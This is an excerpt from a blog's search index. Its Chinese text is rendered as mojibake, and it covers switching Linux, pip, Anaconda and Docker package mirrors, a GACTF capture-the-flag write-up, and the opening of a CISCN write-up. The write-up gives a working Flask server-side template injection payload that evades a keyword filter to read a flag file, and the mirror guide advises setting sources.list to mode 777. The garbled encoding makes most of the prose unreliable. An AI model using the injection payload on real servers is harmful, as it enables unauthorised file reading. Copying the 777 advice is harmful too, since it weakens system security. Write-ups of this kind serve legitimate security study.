é€ƒé€¸å‡ºæ¥ä¸€ä¸ªuserå¯¹è±¡å°±è¡Œäº† u1s1ï¼ŒPHP æ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼Œè¿™é¢˜åé¢å†çœ‹çœ‹æ¥å¤ç°8ï¼ˆå’•å’•å’• ï¼ˆå…ˆæºœäº†å–µ","path":"2020/10/06/CTF_2020CISCN_final/"},{"title":"ç¯å¢ƒæ­å»ºä¹‹æ›´æ¢è½¯ä»¶æºæ±‡æ€»(Ubuntu/pip/Anaconda/Dockerç­‰)","text":"å‰è¨€ä¼—æ‰€å‘¨çŸ¥ï¼Œå¾ˆå¤šå®˜æ–¹è½¯ä»¶æºé»˜è®¤éƒ½åœ¨å›½å¤–ï¼Œåœ¨å›½å†…ä¸‹è½½ä¸æ˜¯ä¸€èˆ¬çš„æ…¢â€¦â€¦ äºæ˜¯æˆ‘ä»¬æƒ³åˆ°äº†é€šè¿‡å›½å†…çš„é•œåƒç«™ï¼Œæ¥åŠ é€Ÿè®¿é—®æˆ–ä¸‹è½½ç­‰ã€‚ æœ€è¿‘æ­å»ºç¯å¢ƒï¼ŒåˆæŠ˜è…¾äº†ä¸€å †æ¢æºï¼Œäºæ˜¯åˆåˆ°å¤„æ‰¾è§‰å¾—æŒºéº»çƒ¦çš„ã€‚ æ­£å¥½è¿™æ¬¡å°±æ¥æ±‡æ€»ä¸€ä¸‹å„ç§å¸¸ç”¨çš„æ¢æºå¥½äº†ã€‚ ç³»ç»Ÿ apt æ¢æºä»¥ Ubuntu ä¸ºä¾‹ï¼š é¦–å…ˆå¤‡ä»½åŸæ–‡ä»¶ sudo cp /etc/apt/sources.list /etc/apt/sources.list.bak ï¼ˆæœ‰å¯èƒ½éœ€è¦ä¿®æ”¹æ–‡ä»¶æƒé™ä¸ºå¯ç¼–è¾‘ï¼‰ sudo chmod 777 /etc/apt/sources.list è€Œåç¼–è¾‘æ–‡ä»¶ sudo vim /etc/apt/sources.list # æˆ– sudo gedit /etc/apt/sources.list éƒ½æ²¡æœ‰çš„è¯å¯ä»¥å…ˆè£…ä¸ªç¼–è¾‘å™¨ï¼Œæˆ–è€… sudo echo \"balabala\" &gt; /etc/apt/sources.list å…¶ä¸­çš„ balabala æ˜¯ä¸‹é¢çš„å†…å®¹ã€‚ æ¸…å tuna æº è¯¦è§ https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/ æœ¬é•œåƒä»…åŒ…å« 32/64 ä½ x86 æ¶æ„å¤„ç†å™¨çš„è½¯ä»¶åŒ…ï¼Œåœ¨ ARM(arm64, armhf)ã€PowerPC(ppc64el)ã€RISC-V(riscv64) å’Œ S390x ç­‰æ¶æ„çš„è®¾å¤‡ä¸Šï¼ˆå¯¹åº”å®˜æ–¹æºä¸ºports.ubuntu.comï¼‰è¯·ä½¿ç”¨ ubuntu-ports é•œåƒã€‚ Ubuntu 18.04 LTS# é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse # é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨ # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse Ubuntu 16.04 LTS# é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-security main restricted universe multiverse # é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨ # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ xenial-proposed main restricted universe multiverse Ubuntu 20.04 LTS# é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse # é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨ # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse Ubuntu Ports æœ¬é•œåƒä»…åŒ…å« arm64 armhf ppc64el riscv64 s390x æ¶æ„çš„è½¯ä»¶åŒ…ã€‚ ï¼ˆæ¯”å¦‚åœ¨ NVIDIA Jetson TX2 ç­‰åµŒå…¥å¼ç³»ç»Ÿä¸Šè·‘çš„ï¼‰ Ubuntu 18.04 LTS: # é»˜è®¤æ³¨é‡Šäº†æºç é•œåƒä»¥æé«˜ apt update é€Ÿåº¦ï¼Œå¦‚æœ‰éœ€è¦å¯è‡ªè¡Œå–æ¶ˆæ³¨é‡Š deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-updates main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-security main restricted universe multiverse # é¢„å‘å¸ƒè½¯ä»¶æºï¼Œä¸å»ºè®®å¯ç”¨ # deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-proposed main restricted universe multiverse # deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu-ports/ bionic-proposed main restricted universe multiverse å…¶ä»–ç‰ˆæœ¬ä¹Ÿç±»ä¼¼ï¼ŒåŠ ä¸ª /ubuntu-ports/ å³å¯ã€‚ Alpine Linuxåœ¨ç»ˆç«¯æ‰§è¡Œä¸‹é¢çš„è¯­å¥ã€‚ sed -i 's/dl-cdn.alpinelinux.org/mirrors.tuna.tsinghua.edu.cn/g' /etc/apk/repositories é˜¿é‡ŒæºUbuntu 18.04 LTSdeb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse 163æºUbuntu 18.04 LTSdeb http://mirrors.163.com/ubuntu/ bionic main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiverse deb http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ bionic main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ bionic-security main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ bionic-updates main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ bionic-proposed main restricted universe multiverse deb-src http://mirrors.163.com/ubuntu/ bionic-backports main restricted universe multiverse æ¢å¥½æºåæ›´æ–°æº sudo apt-get update ä¿®å¤æŸåçš„è½¯ä»¶åŒ…ï¼Œå°è¯•å¸è½½å‡ºé”™çš„åŒ…ï¼Œé‡æ–°å®‰è£…æ­£ç¡®ç‰ˆæœ¬çš„ã€‚ sudo apt-get -f install æ›´æ–°è½¯ä»¶ sudo apt-get upgrade æˆ–è€…å®‰è£…è½¯ä»¶â€¦â€¦ Pypi (pip) æ¢æºæ¸…å tuna æºä¸´æ—¶å®‰è£…æ—¶ï¼š pip install -i https://pypi.tuna.tsinghua.edu.cn/simple some-package some-package ä¸ºæ¨¡å—åã€‚ è®¾ä¸ºé»˜è®¤ï¼š pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U pip config set global.index-url https://pypi.tuna.tsinghua.edu.cn/simple æˆ–è€…ï¼ŒLinux æˆ– MacOS ä¸‹ä¿®æ”¹ ~/.pip/pip.conf ï¼Œè‹¥æ²¡æœ‰æ­¤æ–‡ä»¶åˆ™åˆ›å»ºä¸€ä¸ªæ–°çš„ã€‚ mkdir ~/.pip cd ~/.pip vim pip.conf Windows ä¸‹ï¼š æ–‡ä»¶ç®¡ç†å™¨æ–‡ä»¶è·¯å¾„åœ°å€æ æ•²ï¼š%HOMEPATH% å›è½¦ï¼Œå¿«é€Ÿè¿›å…¥ C:\\Users\\ç”¨æˆ·å\\ æ–‡ä»¶å¤¹ä¸­ï¼ˆç”¨æˆ·ç›®å½•ï¼‰ æ–°å»º pip æ–‡ä»¶å¤¹å¹¶åœ¨æ–‡ä»¶å¤¹ä¸­æ–°å»º pip.ini é…ç½®æ–‡ä»¶ æ–°å¢ pip.ini é…ç½®æ–‡ä»¶å†…å®¹ æ–‡ä»¶å†…å®¹å¦‚ä¸‹ã€‚ [global] index-url = https://pypi.tuna.tsinghua.edu.cn/simple [install] use-mirrors = true mirrors = https://pypi.tuna.tsinghua.edu.cn/simple trusted-host = pypi.tuna.tsinghua.edu.cn å…¶ä»–æº æ¸…åï¼šhttps://pypi.tuna.tsinghua.edu.cn/simple é˜¿é‡Œäº‘ï¼šhttps://mirrors.aliyun.com/pypi/simple ä¸­å›½ç§‘æŠ€å¤§å­¦ https://pypi.mirrors.ustc.edu.cn/simple è±†ç“£ï¼šhttps://pypi.douban.com/simple/ Anaconda æ¢æº å‚è€ƒ https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/ Anaconda å®‰è£…åŒ…å¯ä»¥åˆ° https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/ ä¸‹è½½ã€‚ TUNA è¿˜æä¾›äº† Anaconda ä»“åº“ä¸ç¬¬ä¸‰æ–¹æºï¼ˆconda-forgeã€msys2ã€pytorchç­‰ï¼ŒæŸ¥çœ‹å®Œæ•´åˆ—è¡¨ï¼‰çš„é•œåƒï¼Œå„ç³»ç»Ÿéƒ½å¯ä»¥é€šè¿‡ä¿®æ”¹ç”¨æˆ·ç›®å½•ä¸‹çš„ .condarc æ–‡ä»¶ã€‚Windows ç”¨æˆ·æ— æ³•ç›´æ¥åˆ›å»ºåä¸º .condarc çš„æ–‡ä»¶ï¼Œå¯å…ˆæ‰§è¡Œ conda config --set show_channel_urls yes ç”Ÿæˆè¯¥æ–‡ä»¶ä¹‹åå†ä¿®æ”¹ã€‚ channels: - defaults show_channel_urls: true channel_alias: https://mirrors.tuna.tsinghua.edu.cn/anaconda default_channels: - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/pro - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2 custom_channels: conda-forge: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud msys2: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud bioconda: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud menpo: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud pytorch: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud simpleitk: https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud å³å¯æ·»åŠ  Anaconda Python å…è´¹ä»“åº“ã€‚ è¿è¡Œ conda clean -i æ¸…é™¤ç´¢å¼•ç¼“å­˜ï¼Œä¿è¯ç”¨çš„æ˜¯é•œåƒç«™æä¾›çš„ç´¢å¼•ã€‚ è¿è¡Œ conda create -n myenv numpy æµ‹è¯•ä¸€ä¸‹å§ã€‚ æˆ–è€… conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/ conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/ # è®¾ç½®æœç´¢æ—¶æ˜¾ç¤ºé€šé“åœ°å€ conda config --set show_channel_urls yes conda é¢å¤–åº“ï¼š # pytorch conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/ # å®‰è£…æ—¶PyTorchï¼Œå®˜ç½‘ç»™çš„å®‰è£…å‘½ä»¤éœ€è¦å»æ‰æœ€åçš„-c pytorchï¼Œæ‰èƒ½ä½¿ç”¨æ¸…åæº # conda-forge conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/ # msys2 conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/ # bioconda conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/bioconda/ # menpo conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/menpo/ # è®¾ç½®æœç´¢æ—¶æ˜¾ç¤ºé€šé“åœ°å€ conda config --set show_channel_urls yes Docker æ¢æº å‚è€ƒä¹‹å‰å†™çš„ Docker å®‰è£…åŠå¸¸ç”¨å‘½ä»¤ã€‚ ç¼–è¾‘æ–‡ä»¶Linux ä¸‹ï¼Œç¼–è¾‘æ­¤æ–‡ä»¶ï¼Œå¦‚æœæ²¡æœ‰åˆ™æ–°å»ºã€‚ sudo vim /etc/docker/daemon.json Windows ä¸‹æ–‡ä»¶ä¸º %programdata%\\docker\\config\\daemon.json å†…å®¹å¯ä»¥ä¸ºå¤šä¸ªé•œåƒ { \"registry-mirrors\": [ \"https://docker.mirrors.ustc.edu.cn\", \"https://dockerhub.azk8s.cn/\", \"http://hub-mirror.c.163.com\" ] } é…ç½®å®Œä¹‹åé‡å¯æœåŠ¡sudo systemctl daemon-reload sudo systemctl restart docker æ£€æŸ¥æ˜¯å¦ç”Ÿæ•ˆdocker info çœ‹æœ€åçš„ Registry Mirrors é‡Œæœ‰æ²¡æœ‰æ·»åŠ æˆåŠŸã€‚ å¤§æ¦‚å°±å…ˆæ”¶é›†è¿™ä¹ˆå¤šå§ï¼ˆ","path":"2020/09/25/Server_ChangeSource/"},{"title":"CTF | 2020 GACTF ä¸€ç‚¹ç‚¹WriteUp","text":"å¼•è¨€è¿™å‡ å¤©æœ‰ä¸ª GACTFï¼Œæœ¬æ¥è¿™å‡ å¤©æœ‰ç‚¹äº‹æƒ…æ²¡æ‰“ç®—æ¥çœ‹çš„ï¼Œç»“æœé˜Ÿé‡Œå¸ˆå‚…çªç„¶æ‰”æ¥ä¸ªä»£ç ï¼Œè¿˜ä»¥ä¸ºæ˜¯å¸® debugï¼Œåæ¥æ‰å‘ç°æ˜¯ä¸ª CTF é¢˜ç›®ã€‚ã€‚ï¼ˆåè€¶ äºæ˜¯éšæ„æ¥çœ‹çœ‹é¢˜ç›®äº†ï¼Œå°±ä½›ç³»åšäº†å‡ ä¸ªé¢˜å˜¤å˜¤å˜¤ï¼Œé¡ºä¾¿æ¥å­¦ç‚¹ä¸œè¥¿å°±æ˜¯äº†ã€‚ Misccrymisc 8.25 is Chinese Valentineâ€™s Day.Yesterday my brother told me he was refused by a beautiful girl.He was sooooooooooooo sad and bursted into tears.é“¾æ¥ï¼šhttps://pan.baidu.com/s/1EZzhnAa5Q4OD8y-YEAcjzQæå–ç ï¼š866hhttps://drive.google.com/drive/folders/1gDfMBrtqwvi7f9BaB1ixjogeLDascjED?usp=sharing ä¸‹è½½ä¸‹æ¥ä¸€ä¸ª crymisc.docxï¼Œä¸€çœ‹æ‰“ä¸å¼€æœç„¶æ”¹æˆ zipï¼Œå‘ç°æœ‰ä¼ªåŠ å¯†ã€‚ 1.txt å†…å®¹ä¸ºï¼š I'm going to tell her how i feel.DO YOU WANT TO KNOW WHAT I TOLD HER? å¦å¤–æ˜¯ä¸€å¼ å›¾ç‰‡ï¼Œå‘ç°ç»“å°¾æœ‰ä¸œè¥¿ï¼Œè‡³å°‘æœ‰ä¸ªå‹ç¼©åŒ…ã€‚ æå–å‡ºæ¥ã€‚ SSB3YXMgcmVqZWN0ZWQuLi4uLi5USElTIElTIFRIRSBQQVNTV09SRDpJIFdhbm5hIENyeXl5ISEh é¦–å…ˆå¯¹ä¸Šé¢è¿™æ®µ base64ï¼Œå¾—åˆ°å‹ç¼©åŒ…å¯†ç ã€‚ I was rejected......THIS IS THE PASSWORD:I Wanna Cryyy!!! å‹ç¼©åŒ…éœ€è¦å…ˆè¡¥ä¸Šæ–‡ä»¶å¤´ï¼Œå³å˜æˆ 504B0304â€¦ æ‹¿å¯†ç å»è§£å‹ï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹ã€‚ ğŸ”­ğŸ’™ğŸ°âœŠğŸŒ»ğŸ§ğŸ’™ğŸ˜˜ğŸŒ»ğŸ¶ğŸ’ğŸŒğŸŠğŸ©ğŸšğŸŠğŸ‘¹ğŸ¶ğŸ˜€ğŸ¶ğŸ˜€ğŸ˜˜ğŸ‘¹ğŸ’™ğŸ‚ğŸ’‡ğŸ˜€ğŸ˜€ğŸ˜©ğŸŒ»ğŸŸğŸ‘‚ğŸ¶ğŸ’ğŸŒğŸŠğŸ©ğŸ‘†ğŸ ğŸ™‡ğŸ‚ğŸ‚ğŸ‘¼ğŸ˜±ğŸš”ğŸ¶ğŸ‘‰âœŠğŸ˜±ğŸ ğŸ™‡ğŸ‚ğŸ‚ğŸ‘¼ğŸ˜±ğŸšŠğŸ˜§ğŸ’¨ğŸ’™ğŸ’• That is what i told herâ†‘â†‘â†‘ ä»€ä¹ˆï¼Œæ‚¨å°±æ˜¯æŠ½è±¡å¸¦å¸ˆï¼Ÿ æƒ³èµ·æ¥åœ¨ BJD3rd é‡Œ TaQini å¸ˆå‚…å°±å‡ºè¿‡ä¸€é¢˜ï¼Œå°±æ˜¯ Manual è¿™é¢˜çš„ä¸€éƒ¨åˆ†ã€‚ å‚è€ƒé‚£é¢˜çš„æ€è·¯ï¼Œç›²çŒœå°±æ˜¯ Codemoji äº†ï¼æ ¹æ®æç¤ºkeyåº”è¯¥å°±æ˜¯ä¸ªå“­çš„è¡¨æƒ…å§ï¼Œå°±ğŸ˜­è¿™ä¸ªäº†ã€‚ P.S.: codemoji GitHub repo (Mozilla Public License 2.0) å¥½è€¶ï¼Œå’±ä¹Ÿéƒ¨ç½²ä¸€ä¸ªï¼ å°±åœ¨è¿™é‡Œäº†ï¼-&gt; https://codemoji.miaotony.xyz æ¬¢è¿æ¥ç©å‘€ï¼ˆ äºæ˜¯æ„é€  payload å¦‚ä¸‹ï¼š {\"message\":\"ğŸ”­ğŸ’™ğŸ°âœŠğŸŒ»ğŸ§ğŸ’™ğŸ˜˜ğŸŒ»ğŸ¶ğŸ’ğŸŒğŸŠğŸ©ğŸšğŸŠğŸ‘¹ğŸ¶ğŸ˜€ğŸ¶ğŸ˜€ğŸ˜˜ğŸ‘¹ğŸ’™ğŸ‚ğŸ’‡ğŸ˜€ğŸ˜€ğŸ˜©ğŸŒ»ğŸŸğŸ‘‚ğŸ¶ğŸ’ğŸŒğŸŠğŸ©ğŸ‘†ğŸ ğŸ™‡ğŸ‚ğŸ‚ğŸ‘¼ğŸ˜±ğŸš”ğŸ¶ğŸ‘‰âœŠğŸ˜±ğŸ ğŸ™‡ğŸ‚ğŸ‚ğŸ‘¼ğŸ˜±ğŸšŠğŸ˜§ğŸ’¨ğŸ’™ğŸ’•\",\"key\":\"ğŸ˜­\"} base64encode + URLencodeï¼š eyJtZXNzYWdlIjoi8J%2BUrfCfkpnwn5Cw4pyK8J%2BMu%2FCfkKfwn5KZ8J%2BYmPCfjLvwn4228J%2BSkPCfjYzwn4%2BK8J%2BNqfCfmoHwn4%2BK8J%2BRufCfkLbwn5iA8J%2BQtvCfmIDwn5iY8J%2BRufCfkpnwn42C8J%2BSh%2FCfmIDwn5iA8J%2BYqfCfjLvwn42f8J%2BRgvCfjbbwn5KQ8J%2BNjPCfj4rwn42p8J%2BRhvCfj6Dwn5mH8J%2BNgvCfjYLwn5G88J%2BYsfCfmpTwn5C28J%2BRieKcivCfmLHwn4%2Bg8J%2BZh%2FCfjYLwn42C8J%2BRvPCfmLHwn5qK8J%2BYp%2FCfkqjwn5KZ8J%2BSlSIsImtleSI6IvCfmK0ifQ%3D%3D è€Œåä¸¢å»è§£å¯†ã€‚ https://codemoji.miaotony.xyz/share.html?data=eyJtZXNzYWdlIjoi8J%2BUrfCfkpnwn5Cw4pyK8J%2BMu%2FCfkKfwn5KZ8J%2BYmPCfjLvwn4228J%2BSkPCfjYzwn4%2BK8J%2BNqfCfmoHwn4%2BK8J%2BRufCfkLbwn5iA8J%2BQtvCfmIDwn5iY8J%2BRufCfkpnwn42C8J%2BSh%2FCfmIDwn5iA8J%2BYqfCfjLvwn42f8J%2BRgvCfjbbwn5KQ8J%2BNjPCfj4rwn42p8J%2BRhvCfj6Dwn5mH8J%2BNgvCfjYLwn5G88J%2BYsfCfmpTwn5C28J%2BRieKcivCfmLHwn4%2Bg8J%2BZh%2FCfjYLwn42C8J%2BRvPCfmLHwn5qK8J%2BYp%2FCfkqjwn5KZ8J%2BSlSIsImtleSI6IvCfmK0ifQ%3D%3D å¾—åˆ°flagã€‚ WelcometoGACTF!ThisisthepasswordGACTF{H4ppy_Mi5c_H4ppy_L1fe} Websimpleflask é¢˜ç›®æ¯10åˆ†é’Ÿé‡å¯ï¼Œå¦‚é‡åˆ°æ— æ³•è¿æ¥ï¼Œè¯·ç¨ç­‰ç‰‡åˆ»10ç§’å·¦å³ä¼šå…¨éƒ¨é‡å¯å®Œæ¯• This topic restart every 10 minitues. If you canâ€™t connect, please wait for a while and the restart will be completed. Do not panic Chinaï¼š 124.70.153.63 80-89 Overseasï¼š 149.28.80.82 80-89 POST è®¿é—®ï¼Œæç¤º request.form[\"name\"]ã€‚ å¸¦ä¸Šå‚æ•° nameï¼Œå°è¯• SSTIï¼Œå‘ç°æœ‰æˆã€‚ æŸæ¬¡åˆ©ç”¨æŠ¥é”™çœ‹åˆ°äº†éƒ¨åˆ†æºç ã€‚ é™¤äº†è¿‡æ»¤äº†flagï¼Œåœ¨è¿™ä¸ªcheckå‡½æ•°é‡Œè¿˜è¿‡æ»¤äº†è®¸å¤šï¼Œå°è¯•å‘ç°ï¼ŒåŒ…æ‹¬ä½†ä¸é™äº os, system, pwd, popen, eval, import, request, mro, ', %, +, ,, ï¼ˆç©ºæ ¼ï¼‰, |, \\x ç­‰ç­‰å…³é”®å­—æˆ–ç¬¦å·éƒ½è¢«æ»¤æ‰äº†â€¦â€¦ å•å¼•å·ä¸è¡Œï¼Œä½†åŒå¼•å·å¯è¡Œï¼Œå‘ç°åˆ©ç”¨ \"op\"\"en\" çš„å½¢å¼æ‹¼æ¥å­—ç¬¦ä¸²å¯è¡Œã€‚ æœ¬æ¥æƒ³æ‰¾ PIN çš„ï¼Œä½†è¯•äº†è¯•æ‰€éœ€çš„ä¿¡æ¯æ•´ä¸æ¥ï¼ˆå¥½èœå•Šï¼‰ï¼Œå¯ä»¥å‚è€ƒ Flask debug pinå®‰å…¨é—®é¢˜ è¿™ä¸€ç¯‡æ–‡ç« ã€‚ äºæ˜¯åˆæ•´äº†åŠå¤©ç»•è¿‡â€¦â€¦ é¦–å…ˆæ‹¿åˆ° objectã€‚ ä¸€é¡¿æ“ä½œæ‹¿åˆ° __builtins__ã€‚ å‘ç°chrä¹‹ç±»çš„å‡½æ•°å¹¶æ²¡æœ‰ï¼Œç„¶è€Œå¹¶ä¸èƒ½ç”¨ {% xxx %} æ¥è®¾ç½®å°±å¾ˆéš¾å—ã€‚ æœ¬æ¥æƒ³ç”¨ os.popen è¿™ä¸€æ¨¡å—æ¥æ‰§è¡Œå‘½ä»¤è¯»å–ä¿¡æ¯çš„ï¼Œä½†ä¸çŸ¥é“ä¸ºå•¥read()å°±è¢«æ‹¦äº†ã€‚ æœ€åé—®äº†é˜Ÿé‡Œå¤§å¸ˆå‚…ï¼Œå‘ç°æ¢æˆopenå°±å®Œäº‹äº†ï¼Œå¤ªè‰äº†ï¼ Payload: name={{[].__class__.__bases__[0].__subclasses__()[127].__init__.__globals__.__builtins__[\"op\"\"en\"](\"/fl\"\"ag\").read()}} GACTF{fac9165b6a2b5ac8bd3b99fad0619366} åé¢å†æ•´ç†ä¸€ä¸‹ flask çš„ SSTI å¸¸ç”¨ payload åŠç»•è¿‡æŠ€å·§å§ï¼ˆ å¤§æ¦‚ç‡ä¼šå’•å’•å’•ï¼ˆ EZFLASK flask&amp;flask Chinaï¼š 124.70.206.91 10000-10009 Overseasï¼š 149.28.226.175 10000-10009 # -*- coding: utf-8 -*- from flask import Flask, request import requests from waf import * import time app = Flask(__name__) @app.route('/ctfhint') def ctf(): hint =xxxx # hints trick = xxxx # trick return trick @app.route('/') def index(): # app.txt @app.route('/eval', methods=[\"POST\"]) def my_eval(): # post eval @app.route(xxxxxx, methods=[\"POST\"]) # Secret def admin(): # admin requests if __name__ == '__main__': app.run(host='0.0.0.0',port=8080) ä»–è¿™ä¸ª flask æœåŠ¡å™¨ä¸º Werkzeug/1.0.1 Python/2.7.18ã€‚ è®¿é—® /ctfhintï¼Œå¾—åˆ° too young too simple POST /eval post eval æ²¡æ‰¾åˆ°å“ªé‡Œèƒ½ç”¨ï¼Ÿ admin æ²¡æ‰¾åˆ° route åœ¨å“ªï¼Œå¹¶ä¸çŸ¥é“æ€ä¹ˆç”¨ emmmã€‚ ï¼ˆç­‰å¤ç°å˜¤å˜¤å˜¤ å¤§æ¦‚å°±è¿™ä¹ˆå¤šï¼Œå¼€å­¦äº†å–µå‘œ~ ï¼ˆæºœäº†æºœäº†","path":"2020/08/31/CTF_2020GACTF/"},{"title":"CTF | 2020 CISCNåˆèµ› Z3&LFSR WriteUp","text":"å¼•è¨€å–µå‘œï¼Œå¥½ä¹…æ²¡æ¥å†™åšå®¢äº†å’•å’•å’•ï¼ˆè¿™å°±æ¥é™¤è‰äº†ï¼ å‰ä¸ä¹…æ°´äº†ä¸€æ³¢ CISCN çº¿ä¸Šåˆèµ›ï¼Œæ„Ÿè°¢é˜Ÿå‹å¸¦æˆ‘ç©å¸¦æˆ‘é£~ è¿™é‡Œæ¥å†™ä¸€å†™ Z3ã€LFSR è¿™ä¸¤é¢˜çš„ WriteUpï¼Œé¡ºä¾¿è®°å½•ä¸€ä¸‹ç”¨åˆ°çš„ Z3ã€SageMath æ±‚è§£å·¥å…·å–µã€‚ Z3é¦–å…ˆä¸¢è¿› IDA 